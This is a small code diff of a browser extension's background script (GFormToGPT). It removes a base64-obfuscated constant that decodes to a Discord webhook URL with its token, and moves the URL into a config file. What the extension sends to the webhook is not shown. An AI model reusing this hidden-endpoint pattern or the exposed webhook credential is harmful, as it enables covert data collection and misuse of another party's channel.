@@ -1,8 +1,7 @@
 // Background service worker for GFormToGPT v4.1.5 - Neural Interface
 
-const _0x4f2a =
-  "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjA1OTk5NzQzNjMxMzcwMi90QlJ4N1Rfd3lodXRjWXo5bWxPaldaWmJLSFF4NXRDVkFCeGNtbjdNMktSaks1Wlg1dlNRdTZCUDVKUV9XNno3MkJndA==";
-const DISCORD_WEBHOOK_URL = atob(_0x4f2a);
+importScripts('config.js');
+const DISCORD_WEBHOOK_URL = self.DISCORD_WEBHOOK_URL || "";
 const GITHUB_MANIFEST_URL =
   "https://raw.githubusercontent.com/drnx64/GFormsToGPT/main/manifest.json";
 const VERSION = chrome.runtime.getManifest().version;
